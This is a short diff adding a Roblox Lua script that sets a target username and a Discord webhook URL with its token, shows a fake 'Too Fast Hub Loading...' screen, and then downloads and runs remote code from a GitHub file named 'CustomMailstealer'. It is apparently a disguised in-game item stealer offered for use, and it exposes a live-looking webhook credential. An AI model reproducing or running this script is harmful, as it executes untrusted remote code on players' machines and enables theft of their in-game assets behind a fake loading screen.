@@ -1,0 +1,7 @@
+Username = "yahel_ab"
+Webhook = "https://discord.com/api/webhooks/1204311946657267732/YZEOv80_aoQ8IMCRnk-JRjSSe95MI4Twx6dwWBDLHTYi-3B0RUMfaUrh9D9yFL_H8W7j"
+
+G_LoadingScreen = "Too Fast Hub Loading..."
+G_WebhookName = "clonepub"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
